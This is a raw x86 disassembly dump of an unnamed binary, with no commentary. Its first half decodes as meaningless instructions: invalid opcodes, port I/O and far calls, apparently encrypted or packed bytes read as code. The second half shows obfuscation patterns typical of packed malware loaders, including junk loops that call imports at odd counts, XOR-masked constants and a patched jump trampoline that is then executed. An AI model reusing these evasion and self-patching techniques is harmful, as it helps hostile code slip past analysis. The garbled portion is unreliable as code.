  409b33:	out    dx,eax
  409b34:	jns    0x409bb3
  409b36:	push   eax
  409b37:	arpl   WORD PTR [eax],dx
  409b39:	pop    ds
  409b3a:	pop    ebp
  409b3b:	mov    al,0xef
  409b3d:	inc    ecx
  409b3e:	mov    bl,0xa4
  409b40:	aam    0x9e
  409b42:	in     eax,0x85
  409b44:	add    ch,dl
  409b46:	jb     0x409b76
  409b48:	adc    dl,ah
  409b4a:	fwait
  409b4b:	push   ss
  409b4c:	and    al,0xb6
  409b4e:	push   0xe
  409b50:	fsubr  QWORD PTR [ecx+0x37]
  409b53:	sbb    DWORD PTR [esi-0x5146ae8c],0x25
  409b5a:	call   FWORD PTR [ecx-0x17eafed3]
  409b60:	test   BYTE PTR [eax-0x26],0x93
  409b64:	add    al,0xeb
  409b66:	repz stc 
  409b68:	sub    BYTE PTR [edi],bh
  409b6a:	inc    ebp
  409b6b:	push   edx
  409b6c:	dec    eax
  409b6d:	pop    ebp
  409b6e:	popf   
  409b6f:	push   esi
  409b70:	xor    cl,ch
  409b72:	hlt    
  409b73:	sar    DWORD PTR ds:0xaa904f76,1
  409b79:	pop    edi
  409b7a:	imul   ecx,DWORD PTR [ebx],0x4d8fb1b8
  409b80:	aam    0x70
  409b82:	fmul   DWORD PTR [edi-0x17fba701]
  409b88:	adc    DWORD PTR [esp+esi*1],eax
  409b8b:	out    0xec,eax
  409b8d:	xchg   edx,eax
  409b8e:	repz (bad) 
  409b90:	xchg   ebp,eax
  409b91:	mov    ds:0x172a4a13,al
  409b96:	loopne 0x409b3f
  409b98:	mov    DWORD PTR [edi-0x36c1084e],edx
  409b9e:	mov    ah,0x1f
  409ba0:	push   esi
  409ba1:	ror    BYTE PTR [ebx-0x2e407f42],1
  409ba7:	inc    ebx
  409ba8:	std    
  409ba9:	push   ds
  409baa:	sub    BYTE PTR [ecx-0x7c],ah
  409bad:	push   edi
  409bae:	push   ebp
  409baf:	arpl   WORD PTR [edx+eiz*4],cx
  409bb2:	out    dx,eax
  409bb3:	sub    esi,DWORD PTR [eax]
  409bb5:	outs   dx,BYTE PTR ds:[esi]
  409bb6:	lock push ebx
  409bb8:	retf   0x4350
  409bbb:	popf   
  409bbc:	or     ecx,ecx
  409bbe:	inc    esp
  409bbf:	dec    ebx
  409bc0:	xchg   edx,eax
  409bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bc2:	cmp    BYTE PTR [ebx-0x4cbb3e66],ch
  409bc8:	inc    edx
  409bc9:	adc    al,BYTE PTR [esi]
  409bcb:	arpl   sp,bp
  409bcd:	add    DWORD PTR [eax+0x35],0x40
  409bd1:	aad    0xa3
  409bd3:	js     0x409c36
  409bd5:	xchg   ebx,eax
  409bd6:	out    dx,eax
  409bd7:	fidiv  DWORD PTR [edi-0x61afd84]
  409bdd:	xchg   esi,eax
  409bde:	add    bl,BYTE PTR [edi+0x60215ff6]
  409be4:	and    esp,esp
  409be6:	std    
  409be7:	into   
  409be8:	push   ecx
  409be9:	add    eax,0x1dcbdbe
  409bef:	jmp    0x409ba4
  409bf1:	add    eax,0xc39b801c
  409bf6:	ins    DWORD PTR es:[edi],dx
  409bf7:	sbb    DWORD PTR [ebx-0x58],esp
  409bfa:	or     DWORD PTR [edx-0x15],edi
  409bfd:	in     eax,0xba
  409bff:	pop    ebx
  409c00:	fbld   TBYTE PTR [ecx-0x4cd90d21]
  409c06:	lea    edx,[esi+eiz*2+0x7b66280d]
  409c0d:	mov    al,ds:0x2c5fc5f8
  409c12:	or     edi,DWORD PTR [esi-0x5c]
  409c15:	ss push ebp
  409c17:	xchg   edi,eax
  409c18:	ins    BYTE PTR es:[edi],dx
  409c19:	and    BYTE PTR [ecx],ch
  409c1b:	or     eax,0xa9b3c76b
  409c20:	jecxz  0x409bc2
  409c22:	ds mov bh,0xb3
  409c25:	out    dx,eax
  409c26:	ss es sub eax,0xe08eec92
  409c2d:	jl     0x409c21
  409c2f:	xor    ah,BYTE PTR [ecx]
  409c31:	ins    DWORD PTR es:[edi],dx
  409c32:	jge    0x409c39
  409c34:	enter  0x25a7,0xc6
  409c38:	xchg   edi,eax
  409c39:	pop    eax
  409c3a:	hlt    
  409c3b:	mov    ds:0x46173401,eax
  409c40:	mov    dh,bh
  409c42:	mov    esp,0x7d69d58f
  409c47:	add    ah,BYTE PTR [edi+0x3d8ee45e]
  409c4d:	iret   
  409c4e:	sbb    bl,BYTE PTR [edi+ebx*2-0x329d31f1]
  409c55:	add    DWORD PTR [esi-0x50],edi
  409c58:	mov    ch,0xa
  409c5a:	inc    edi
  409c5b:	xor    al,0x4d
  409c5d:	mov    edx,0x13f13756
  409c62:	fimul  WORD PTR [ebx]
  409c64:	xchg   ebx,eax
  409c65:	test   eax,0xbd497e3d
  409c6a:	in     al,dx
  409c6b:	or     eax,0xfdc19e52
  409c70:	jne    0x409ce6
  409c72:	push   ecx
  409c73:	enter  0x6c26,0x6b
  409c77:	sub    eax,0xe53d93c9
  409c7c:	mov    ebx,DWORD PTR [ebp-0x2a]
  409c7f:	sub    al,0x47
  409c81:	xor    ecx,DWORD PTR [ecx]
  409c83:	ss test eax,0x7ae0afdf
  409c89:	or     BYTE PTR [ebx+0x7fc19993],0xce
  409c90:	in     eax,0x6
  409c92:	mov    al,0x5f
  409c94:	addr16 xchg eax,ebp
  409c97:	fsubr  DWORD PTR [edx-0x47d12522]
  409c9d:	xchg   esp,eax
  409c9e:	cmp    ebx,eax
  409ca0:	sbb    bl,BYTE PTR [ebp+eiz*8-0x1f]
  409ca4:	and    BYTE PTR [esi],ch
  409ca6:	mov    esi,DWORD PTR [edi+0x12]
  409ca9:	jg     0x409cbb
  409cab:	pop    edx
  409cac:	popf   
  409cad:	add    ebp,edi
  409caf:	cmp    DWORD PTR [esi-0x73],esi
  409cb2:	dec    eax
  409cb3:	dec    eax
  409cb4:	pop    es
  409cb5:	push   ebp
  409cb6:	adc    ebx,DWORD PTR [edi*4+0x63700c06]
  409cbd:	sub    edi,DWORD PTR [ebp+edx*4-0x490244c8]
  409cc4:	inc    ecx
  409cc5:	mov    ds:0x500aa4df,al
  409cca:	out    dx,al
  409ccb:	pop    ds
  409ccc:	cmp    eax,0xa3696133
  409cd1:	push   ebx
  409cd2:	ins    DWORD PTR es:[edi],dx
  409cd3:	or     BYTE PTR [esi],ch
  409cd5:	jb     0x409cd4
  409cd7:	inc    eax
  409cd8:	pop    ss
  409cd9:	jp     0x409cbd
  409cdb:	or     al,0xd1
  409cdd:	fwait
  409cde:	sbb    dh,BYTE PTR [ecx-0x2fc8ffd4]
  409ce4:	inc    ecx
  409ce5:	test   DWORD PTR [esi+0x31],esi
  409ce8:	mov    ch,0xa8
  409cea:	mov    ebx,es
  409cec:	sti    
  409ced:	addr16 pop edi
  409cef:	outs   dx,BYTE PTR ds:[esi]
  409cf0:	fimul  DWORD PTR [edx-0x29ad9166]
  409cf6:	and    eax,0xa5575448
  409cfb:	add    eax,0x94a18180
  409d00:	fldenv [edx+0x20]
  409d03:	inc    ecx
  409d04:	int3   
  409d05:	mov    ebp,0x3eb126c6
  409d0a:	dec    eax
  409d0b:	call   0x33cd0e9d
  409d10:	repz xchg esp,eax
  409d12:	lods   al,BYTE PTR ds:[esi]
  409d13:	sbb    eax,0x27e88f1e
  409d18:	cmc    
  409d19:	push   ecx
  409d1a:	mov    BYTE PTR ds:0x7e711638,0xa4
  409d21:	mov    ebp,0x27047aab
  409d26:	pop    esp
  409d27:	xor    BYTE PTR [esi+edi*8+0x435095a6],dl
  409d2e:	mov    eax,DWORD PTR [edx-0x403937c]
  409d34:	js     0x409d7c
  409d36:	adc    al,0x2d
  409d38:	cmp    DWORD PTR [ebp+0x65],ebx
  409d3b:	ficomp DWORD PTR [edx+0x13]
  409d3e:	jbe    0x409dbf
  409d40:	mov    ebx,0xfbc3cd1a
  409d45:	addr16 adc eax,0x2522f646
  409d4b:	cdq    
  409d4c:	(bad)  
  409d4d:	(bad)  [ecx-0x1fb929dc]
  409d53:	and    DWORD PTR [ebp+ebx*4-0x1e],0xfffffff1
  409d58:	cmc    
  409d59:	mov    ebx,0x46280c65
  409d5e:	nop
  409d5f:	xchg   esi,eax
  409d60:	push   ecx
  409d61:	sbb    cl,bl
  409d63:	gs xchg esi,eax
  409d65:	sub    al,0x7
  409d67:	mov    ds:0x6ed6d1d4,al
  409d6c:	rol    BYTE PTR [ecx+0x7e],cl
  409d6f:	xchg   DWORD PTR [esi+0x4b],esi
  409d72:	mov    eax,ds:0x8393e50a
  409d77:	(bad)  
  409d78:	dec    ebp
  409d79:	mov    ebp,0x1e92e160
  409d7e:	stc    
  409d7f:	out    dx,al
  409d80:	fwait
  409d81:	adc    al,0x50
  409d83:	xor    DWORD PTR [esi-0xb4560f0],ecx
  409d89:	stos   BYTE PTR es:[edi],al
  409d8a:	mov    ebp,0x4ad05550
  409d8f:	mov    BYTE PTR [esi+edi*2+0x47],bl
  409d93:	fwait
  409d94:	sbb    eax,0x6fc8d6d1
  409d99:	fist   DWORD PTR [edx+eiz*1+0x2eded27f]
  409da0:	sub    BYTE PTR [edx-0x770872fe],ch
  409da6:	jle    0x409d28
  409da8:	out    dx,eax
  409da9:	push   es
  409daa:	sub    al,BYTE PTR [ebx]
  409dac:	xor    bh,BYTE PTR [ecx-0x79360274]
  409db2:	ds push 0x7d
  409db5:	cmp    BYTE PTR [edi+0x26a47942],dh
  409dbb:	cmp    dl,BYTE PTR [ebx+0x5f]
  409dbe:	push   edx
  409dbf:	inc    ebx
  409dc0:	popa   
  409dc1:	in     eax,0x2
  409dc3:	and    al,0x4b
  409dc5:	ds sbb dh,bl
  409dc8:	pop    ebp
  409dc9:	cmp    eax,0xe046736f
  409dce:	fdivr  st,st(1)
  409dd0:	gs test cl,dl
  409dd3:	push   ebp
  409dd4:	into   
  409dd5:	aas    
  409dd6:	pushf  
  409dd7:	fdecstp 
  409dd9:	add    dl,BYTE PTR [eax+0x3057d45]
  409ddf:	cs and BYTE PTR ss:[edx+0x4f],0xc8
  409de5:	popf   
  409de6:	loopne 0x409e01
  409de8:	jecxz  0x409d7d
  409dea:	inc    esp
  409deb:	push   cs
  409dec:	adc    bl,cl
  409dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409def:	jl     0x409d9b
  409df1:	clc    
  409df2:	lods   eax,DWORD PTR ds:[esi]
  409df3:	sub    al,0xba
  409df5:	jge    0x409e3d
  409df7:	fst    QWORD PTR [ebp+eax*2+0xa90580f]
  409dfe:	jmp    0x7843:0xab6895cd
  409e05:	push   esp
  409e06:	(bad)  
  409e07:	jno    0x409e52
  409e09:	push   ss
  409e0a:	outs   dx,WORD PTR ds:[esi]
  409e0c:	mov    bh,0xa
  409e0e:	call   FWORD PTR ds:0x1f06573d
  409e14:	pop    edx
  409e15:	inc    esi
  409e16:	psrad  mm4,QWORD PTR ds:[edx]
  409e1a:	ds xchg ecx,eax
  409e1c:	aaa    
  409e1d:	jno    0x409dea
  409e1f:	jmp    ebp
  409e21:	and    DWORD PTR [eax+0x16],edx
  409e24:	add    bh,ah
  409e26:	arpl   WORD PTR [ecx],si
  409e28:	aam    0x91
  409e2a:	inc    esi
  409e2b:	add    DWORD PTR [edi+0x5cabd032],ebx
  409e31:	push   ebx
  409e32:	adc    ebx,ebp
  409e34:	xor    eax,0x75abbc39
  409e39:	(bad)  
  409e3a:	mov    bh,0xac
  409e3c:	in     eax,0xe9
  409e3e:	push   ds
  409e3f:	pop    es
  409e40:	pusha  
  409e41:	dec    ecx
  409e42:	or     al,BYTE PTR [ebx]
  409e44:	push   ds
  409e45:	imul   ecx,DWORD PTR [edx-0x2b32d4b4],0x222ebec1
  409e4f:	outs   dx,BYTE PTR ds:[esi]
  409e50:	and    edx,DWORD PTR [ebx-0x54097c92]
  409e56:	sub    BYTE PTR [esi+ebp*1],0xec
  409e5a:	pop    ebx
  409e5b:	sub    bl,bl
  409e5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e5e:	xchg   esi,eax
  409e5f:	fsubr  DWORD PTR [edi-0x231e2f12]
  409e65:	and    ch,bl
  409e67:	cmp    edx,DWORD PTR [eax-0x48]
  409e6a:	mov    ch,0x6f
  409e6c:	cmp    BYTE PTR [edi],dl
  409e6e:	and    BYTE PTR [edi+ecx*1-0x51],bh
  409e72:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  409e78:	mov    ecx,DWORD PTR [ebp+0x8]
  409e7b:	lea    ecx,[edx+ecx*1+0x3272dd]
  409e82:	cmp    ecx,eax
  409e84:	je     0x409efb
  409e8a:	mov    edi,DWORD PTR [ebp-0x14]
  409e8d:	mov    eax,DWORD PTR [ebp+0x8]
  409e90:	mov    edx,DWORD PTR [ebp+0x14]
  409e93:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409e97:	mov    ecx,0x7510896
  409e9c:	xor    edx,edx
  409e9e:	xor    edi,ecx
  409ea0:	mov    esi,0x3272dd
  409ea5:	add    edi,esi
  409ea7:	div    edi
  409ea9:	mov    edx,DWORD PTR [ebp-0x4]
  409eac:	xor    edx,ecx
  409eae:	lea    eax,[edx+eax*1+0x3272dd]
  409eb5:	mov    edx,DWORD PTR [ebp+0x8]
  409eb8:	mov    edi,DWORD PTR [ebp-0x20]
  409ebb:	mov    DWORD PTR [edi+edx*4],eax
  409ebe:	mov    eax,DWORD PTR [ebp-0x14]
  409ec1:	mov    edx,DWORD PTR [ebp+0x8]
  409ec4:	xor    eax,ecx
  409ec6:	lea    eax,[eax+edx*1+0x3272dd]
  409ecd:	mov    DWORD PTR [ebp+0x8],eax
  409ed0:	mov    eax,DWORD PTR [ebp-0x14]
  409ed3:	mov    edx,DWORD PTR [ebp+0x14]
  409ed6:	xor    eax,ecx
  409ed8:	add    eax,esi
  409eda:	imul   eax,DWORD PTR [edx]
  409edd:	mov    edx,DWORD PTR [ebp-0x4]
  409ee0:	xor    edx,ecx
  409ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  409ee5:	lea    ecx,[edx+ecx*1+0x3272dd]
  409eec:	cmp    ecx,eax
  409eee:	jne    0x409e8a
  409ef4:	mov    eax,esi
  409ef6:	jmp    0x409f00
  409efb:	mov    eax,0x3272dd
  409f00:	mov    ebx,0x7510896
  409f05:	mov    ecx,DWORD PTR [ebp-0x4]
  409f08:	xor    ecx,ebx
  409f0a:	add    ecx,eax
  409f0c:	mov    DWORD PTR [ebp-0xc],ecx
  409f0f:	mov    ebx,0x65655
  409f14:	add    ebx,0x3234
  409f1a:	xchg   ebx,esi
  409f1c:	xor    ebx,ebx
  409f1e:	push   esi
  409f1f:	mov    esi,ebx
  409f21:	pop    ebx
  409f22:	mov    edx,esi
  409f24:	add    ebx,0x1002
  409f2a:	lea    eax,[ebp-0x10]
  409f2d:	add    edx,eax
  409f2f:	add    edx,0x5
  409f32:	push   edx
  409f33:	inc    esi
  409f34:	pop    ecx
  409f35:	dec    ecx
  409f36:	xchg   ecx,eax
  409f37:	dec    eax
  409f38:	xchg   ecx,eax
  409f39:	dec    ecx
  409f3a:	xchg   ecx,edx
  409f3c:	dec    edx
  409f3d:	push   edx
  409f3e:	mov    edx,ebx
  409f40:	pop    ebx
  409f41:	dec    ebx
  409f42:	call   DWORD PTR [ebx]
  409f44:	cmp    DWORD PTR [ebp+0x10],esi
  409f47:	je     0x409f66
  409f4d:	xchg   edx,eax
  409f4e:	push   0xb
  409f50:	pop    ecx
  409f51:	push   0x4
  409f53:	pop    ebx
  409f54:	inc    ebx
  409f55:	xchg   ebx,ecx
  409f57:	sub    ebx,ecx
  409f59:	xchg   ebx,ecx
  409f5b:	dec    ecx
  409f5c:	dec    ecx
  409f5d:	mov    eax,DWORD PTR [ebp-0x1c]
  409f60:	imul   eax,ecx
  409f63:	add    esp,eax
  409f65:	xchg   edx,eax
  409f66:	push   eax
  409f67:	xor    ebx,ebx
  409f69:	mov    edx,esp
  409f6b:	dec    edx
  409f6c:	inc    ebx
  409f6d:	add    ebx,DWORD PTR [edx+ebx*1]
  409f70:	dec    ebx
  409f71:	xor    edx,edx
  409f73:	add    DWORD PTR [ebp-0xc],ebx
  409f76:	pop    ebx
  409f77:	mov    eax,DWORD PTR [ebp-0xc]
  409f7a:	pop    edi
  409f7b:	pop    esi
  409f7c:	pop    ebx
  409f7d:	leave  
  409f7e:	ret    0x10
  409f81:	push   ebp
  409f82:	mov    ebp,esp
  409f84:	sub    esp,0x7c
  409f87:	xor    ecx,ecx
  409f89:	xor    ecx,DWORD PTR ds:0x42c014
  409f8f:	xor    DWORD PTR ds:0x42d018,ecx
  409f95:	push   esi
  409f96:	push   edi
  409f97:	movzx  edi,WORD PTR ds:0x429014
  409f9e:	adc    edi,DWORD PTR ds:0x42c018
  409fa4:	mov    DWORD PTR ds:0x429014,edi
  409faa:	mov    eax,ds:0x42e435
  409faf:	or     ecx,0x9a5
  409fb5:	mov    DWORD PTR [ebp-0x24],eax
  409fb8:	mov    eax,ds:0x42e541
  409fbd:	mov    DWORD PTR [ebp-0x34],eax
  409fc0:	or     edi,eax
  409fc2:	and    DWORD PTR [ebp-0x30],0x0
  409fc6:	xor    DWORD PTR ds:0x429018,0x17b1
  409fd0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  409fd7:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  409fde:	mov    eax,DWORD PTR [ebp-0x10]
  409fe1:	mov    ecx,DWORD PTR [ebp-0x10]
  409fe4:	sub    eax,ecx
  409fe6:	mov    DWORD PTR [ebp-0x10],eax
  409fe9:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  409ff0:	and    DWORD PTR ds:0x42901c,0x0
  409ffa:	xor    eax,eax
  409ffc:	or     eax,DWORD PTR ds:0x42901c
  40a002:	inc    eax
  40a003:	mov    ds:0x42901c,eax
  40a008:	cmp    DWORD PTR ds:0x42901c,0xb
  40a00f:	jne    0x40a029
  40a015:	push   0x42e14e
  40a01a:	push   DWORD PTR [ebp-0xc]
  40a01d:	push   DWORD PTR [ebp-0x18]
  40a020:	push   DWORD PTR [ebp-0x24]
  40a023:	call   DWORD PTR ds:0x42ed61
  40a029:	cmp    DWORD PTR ds:0x42901c,0xa
  40a030:	jne    0x40a041
  40a036:	mov    eax,ds:0x42901c
  40a03b:	inc    eax
  40a03c:	mov    ds:0x42901c,eax
  40a041:	cmp    DWORD PTR ds:0x42901c,0x13
  40a048:	jb     0x409ffa
  40a04e:	sub    eax,esi
  40a050:	mov    eax,DWORD PTR [ebp-0x18]
  40a053:	mov    ecx,DWORD PTR [ebp-0x18]
  40a056:	sub    eax,ecx
  40a058:	mov    DWORD PTR [ebp-0x18],eax
  40a05b:	and    DWORD PTR ds:0x429000,0x0
  40a065:	mov    edi,DWORD PTR ds:0x429000
  40a06b:	inc    edi
  40a06c:	mov    DWORD PTR ds:0x429000,edi
  40a072:	cmp    DWORD PTR ds:0x429000,0xe
  40a079:	jne    0x40a08f
  40a07f:	push   0x429000
  40a084:	push   0x4a29
  40a089:	call   DWORD PTR ds:0x42ed65
  40a08f:	cmp    DWORD PTR ds:0x429000,0xd
  40a096:	jne    0x40a0ab
  40a09c:	xor    edi,edi
  40a09e:	or     edi,DWORD PTR ds:0x429000
  40a0a4:	inc    edi
  40a0a5:	mov    DWORD PTR ds:0x429000,edi
  40a0ab:	cmp    DWORD PTR ds:0x429000,0x1e
  40a0b2:	jb     0x40a065
  40a0b8:	and    eax,0x2f3f
  40a0bd:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  40a0c4:	mov    eax,DWORD PTR [ebp-0xc]
  40a0c7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a0ca:	or     edi,esi
  40a0cc:	sub    eax,ecx
  40a0ce:	xor    edi,edi
  40a0d0:	xor    edi,DWORD PTR ds:0x42d004
  40a0d6:	and    DWORD PTR ds:0x429008,edi
  40a0dc:	mov    DWORD PTR [ebp-0xc],eax
  40a0df:	sbb    DWORD PTR ds:0x42a018,0x66a3
  40a0e9:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40a0f0:	adc    DWORD PTR ds:0x42b010,ecx
  40a0f6:	mov    eax,DWORD PTR [ebp-0x1c]
  40a0f9:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a0fc:	xor    esi,esi
  40a0fe:	xor    esi,DWORD PTR ds:0x411fec
  40a104:	mov    edi,DWORD PTR ds:0x411ff8
  40a10a:	sub    edi,esi
  40a10c:	and    esi,DWORD PTR [esi+edi*1]
  40a10f:	sub    eax,ecx
  40a111:	and    DWORD PTR ds:0x42c008,0x0
  40a11b:	mov    ecx,DWORD PTR ds:0x42c008
  40a121:	inc    ecx
  40a122:	mov    DWORD PTR ds:0x42c008,ecx
  40a128:	cmp    DWORD PTR ds:0x42c008,0x16
  40a12f:	jne    0x40a159
  40a135:	push   0x2fca
  40a13a:	push   0x42c014
  40a13f:	push   0x8b86
  40a144:	push   0x42e0af
  40a149:	push   0x5b55
  40a14e:	push   0x1406
  40a153:	call   DWORD PTR ds:0x42ed6d
  40a159:	cmp    DWORD PTR ds:0x42c008,0x10
  40a160:	jb     0x40a11b
  40a166:	add    DWORD PTR ds:0x42a018,ecx
  40a16c:	mov    DWORD PTR [ebp-0x1c],eax
  40a16f:	adc    DWORD PTR ds:0x42d018,ebx
  40a175:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40a17c:	mov    eax,DWORD PTR [ebp-0x20]
  40a17f:	mov    ecx,DWORD PTR [ebp-0x20]
  40a182:	mov    DWORD PTR ds:0x42c014,0x17
  40a18c:	cmp    DWORD PTR ds:0x42c014,0x0
  40a193:	je     0x40a1be
  40a199:	cmp    DWORD PTR ds:0x42c014,0x22
  40a1a0:	jne    0x40a1ac
  40a1a6:	call   DWORD PTR ds:0x42ed71
  40a1ac:	mov    esi,DWORD PTR ds:0x42c014
  40a1b2:	dec    esi
  40a1b3:	mov    DWORD PTR ds:0x42c014,esi
  40a1b9:	jmp    0x40a18c
  40a1be:	sub    eax,ecx
  40a1c0:	and    DWORD PTR ds:0x42a004,0x0
  40a1ca:	jmp    0x40a1dc
  40a1cf:	mov    edi,DWORD PTR ds:0x42a004
  40a1d5:	inc    edi
  40a1d6:	mov    DWORD PTR ds:0x42a004,edi
  40a1dc:	cmp    DWORD PTR ds:0x42a004,0x15
  40a1e3:	jae    0x40a220
  40a1e9:	cmp    DWORD PTR ds:0x42a004,0x6
  40a1f0:	jne    0x40a201
  40a1f6:	push   0x42c008
  40a1fb:	call   DWORD PTR ds:0x42ed75
  40a201:	cmp    DWORD PTR ds:0x42a004,0x5
  40a208:	jne    0x40a21b
  40a20e:	mov    edi,DWORD PTR ds:0x42a004
  40a214:	inc    edi
  40a215:	mov    DWORD PTR ds:0x42a004,edi
  40a21b:	jmp    0x40a1cf
  40a220:	mov    DWORD PTR [ebp-0x20],eax
  40a223:	mov    eax,DWORD PTR [ebp-0x2c]
  40a226:	mov    ecx,DWORD PTR [ebp-0x20]
  40a229:	mov    esi,0x7510896
  40a22e:	xor    eax,esi
  40a230:	mov    edi,0x3272dd
  40a235:	add    eax,edi
  40a237:	or     eax,ecx
  40a239:	mov    DWORD PTR [ebp-0x20],eax
  40a23c:	mov    eax,DWORD PTR [ebp-0x4]
  40a23f:	mov    ecx,DWORD PTR [ebp-0x4]
  40a242:	sub    eax,ecx
  40a244:	mov    DWORD PTR [ebp-0x4],eax
  40a247:	or     DWORD PTR [ebp-0x4],0xf89c85be
  40a24e:	mov    eax,DWORD PTR [ebp-0xc]
  40a251:	xor    eax,esi
  40a253:	add    eax,edi
  40a255:	push   eax
  40a256:	mov    eax,DWORD PTR [ebp-0x10]
  40a259:	xor    eax,esi
  40a25b:	add    eax,edi
  40a25d:	push   eax
  40a25e:	mov    eax,DWORD PTR [ebp-0x4]
  40a261:	xor    eax,esi
  40a263:	add    eax,edi
  40a265:	push   eax
  40a266:	lea    eax,[ebp-0x7c]
  40a269:	push   eax
  40a26a:	push   DWORD PTR [ebp-0x2c]
  40a26d:	push   DWORD PTR [ebp-0x28]
  40a270:	call   0x40f163
  40a275:	test   eax,eax
  40a277:	je     0x40a2a5
  40a27d:	lea    eax,[ebp-0x7c]
  40a280:	push   eax
  40a281:	mov    eax,DWORD PTR [ebp-0x28]
  40a284:	xor    eax,esi
  40a286:	add    eax,edi
  40a288:	push   eax
  40a289:	mov    eax,DWORD PTR [ebp-0x24]
  40a28c:	add    eax,0xaa
  40a291:	push   eax
  40a292:	mov    eax,DWORD PTR [ebp-0x24]
  40a295:	mov    eax,DWORD PTR [eax+0x198]
  40a29b:	push   DWORD PTR [eax]
  40a29d:	call   0x40508b
  40a2a2:	mov    DWORD PTR [ebp-0x14],eax
  40a2a5:	lea    eax,[ebp+0x4]
  40a2a8:	mov    DWORD PTR [ebp-0x30],eax
  40a2ab:	mov    eax,DWORD PTR [ebp-0x14]
  40a2ae:	test   eax,eax
  40a2b0:	je     0x40a318
  40a2b6:	lea    eax,[ebp-0x8]
  40a2b9:	mov    DWORD PTR [ebp-0x38],eax
  40a2bc:	mov    eax,DWORD PTR [ebp-0x34]
  40a2bf:	mov    DWORD PTR [ebp-0x8],eax
  40a2c2:	mov    eax,DWORD PTR [ebp-0x8]
  40a2c5:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2c8:	sub    eax,ecx
  40a2ca:	mov    DWORD PTR [ebp-0x8],eax
  40a2cd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2d0:	xor    ecx,esi
  40a2d2:	mov    eax,0xffcd8d23
  40a2d7:	sub    eax,ecx
  40a2d9:	add    DWORD PTR [ebp-0x8],eax
  40a2dc:	mov    eax,DWORD PTR [ebp-0x8]
  40a2df:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2e2:	mov    DWORD PTR [ecx+0x1],eax
  40a2e5:	mov    eax,DWORD PTR [ebp-0x14]
  40a2e8:	push   DWORD PTR [ebp-0x24]
  40a2eb:	mov    BYTE PTR [eax],0xe9
  40a2ee:	mov    eax,ds:0x42e2b1
  40a2f3:	push   DWORD PTR [eax]
  40a2f5:	push   DWORD PTR ds:0x42e50d
  40a2fb:	push   DWORD PTR ds:0x42e2b9
  40a301:	push   DWORD PTR ds:0x42e4ed
  40a307:	push   DWORD PTR ds:0x42eafd
  40a30d:	push   DWORD PTR [ebp-0x28]
  40a310:	push   DWORD PTR [ebp-0x2c]
  40a313:	mov    eax,DWORD PTR [ebp-0x14]
  40a316:	call   eax
  40a318:	mov    eax,DWORD PTR [ebp-0x30]
  40a31b:	mov    ecx,DWORD PTR ds:0x42e4b1
  40a321:	add    DWORD PTR [eax],ecx
  40a323:	pop    edi
  40a324:	pop    esi
  40a325:	leave  
  40a326:	ret    
  40a327:	push   ebp
  40a328:	mov    ebp,esp
  40a32a:	sub    esp,0x18
  40a32d:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  40a334:	lea    eax,[ebp+0x14]
  40a337:	mov    DWORD PTR [ebp-0x4],eax
  40a33a:	add    edx,0x781f
  40a340:	push   esi
  40a341:	and    esi,esi
  40a343:	mov    esi,0xf89c85b5
  40a348:	mov    DWORD PTR [ebp-0xc],esi
  40a34b:	lea    eax,[ebp-0xc]
  40a34e:	mov    DWORD PTR [ebp-0x14],eax
  40a351:	mov    eax,DWORD PTR [ebp-0xc]
  40a354:	mov    edx,DWORD PTR [ebp-0x14]
  40a357:	mov    ecx,0x7510896
  40a35c:	and    DWORD PTR ds:0x42d010,0x34d
  40a366:	xor    eax,ecx
  40a368:	sub    DWORD PTR ds:0x42a00c,0x429018
  40a372:	add    eax,0x3272dd
  40a377:	adc    DWORD PTR ds:0x42d00c,0x760b
  40a381:	mov    DWORD PTR [edx],eax
  40a383:	dec    edx
  40a384:	mov    eax,ds:0x42e2ad
  40a389:	sub    DWORD PTR ds:0x429008,ecx
  40a38f:	mov    edx,DWORD PTR [ebp-0x4]
  40a392:	mov    eax,DWORD PTR [eax]
  40a394:	and    DWORD PTR ds:0x42d004,0x42a01c
  40a39e:	add    eax,DWORD PTR [edx]
  40a3a0:	push   edi
  40a3a1:	mov    DWORD PTR [ebp-0x8],eax
  40a3a4:	and    DWORD PTR ds:0x42c008,0x0
  40a3ae:	jmp    0x40a3c0
  40a3b3:	mov    edi,DWORD PTR ds:0x42c008
  40a3b9:	inc    edi
  40a3ba:	mov    DWORD PTR ds:0x42c008,edi
  40a3c0:	cmp    DWORD PTR ds:0x42c008,0x1f
  40a3c7:	jae    0x40a451
  40a3cd:	cmp    DWORD PTR ds:0x42c008,0x25
  40a3d4:	jne    0x40a3e8
  40a3da:	push   0x3550
  40a3df:	push   DWORD PTR [ebp-0x1c]
  40a3e2:	call   DWORD PTR ds:0x42ed35
  40a3e8:	jmp    0x40a3b3
  40a3ed:	and    DWORD PTR ds:0x42d018,0x0
  40a3f7:	jmp    0x40a407
  40a3fc:	mov    eax,ds:0x42d018
  40a401:	inc    eax
  40a402:	mov    ds:0x42d018,eax
  40a407:	cmp    DWORD PTR ds:0x42d018,0x1a
  40a40e:	jae    0x40a451
  40a414:	cmp    DWORD PTR ds:0x42d018,0x8
  40a41b:	jne    0x40a434
  40a421:	push   DWORD PTR [ebp-0x1c]
  40a424:	push   0x42d014
  40a429:	push   0x5fa0
  40a42e:	call   DWORD PTR ds:0x42ed39
  40a434:	cmp    DWORD PTR ds:0x42d018,0x7
  40a43b:	jne    0x40a44c
  40a441:	mov    eax,ds:0x42d018
  40a446:	inc    eax
  40a447:	mov    ds:0x42d018,eax
  40a44c:	jmp    0x40a3fc
  40a451:	mov    edi,DWORD PTR [ebp+0x8]
  40a454:	mov    eax,ds:0x42e435
  40a459:	and    DWORD PTR ds:0x42a00c,0x728
